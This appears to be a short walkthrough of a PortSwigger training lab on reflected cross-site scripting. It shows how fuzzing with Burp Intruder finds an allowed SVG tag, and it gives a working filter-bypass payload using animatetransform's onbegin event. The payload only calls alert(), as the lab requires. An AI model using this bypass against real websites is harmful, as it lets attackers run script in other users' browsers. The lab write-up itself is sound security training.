# Reflected XSS with some SVG markup allowed

## This lab has a simple [reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) vulnerability. The site is blocking common tags but misses some SVG tags and events.

## To solve the lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert()` function.

### HINT:

`<svg><animatetransform onbegin=alert(1) attributeName=transform>`

### step1

search test in search bar
send to intruder and add search in search <§§> with payload copy tag to clipboard

200 response from `<animatetransform> `

serach `<svg><animatetransform onbegin=alert(1) attributeName=transform>` into search bar lab solved
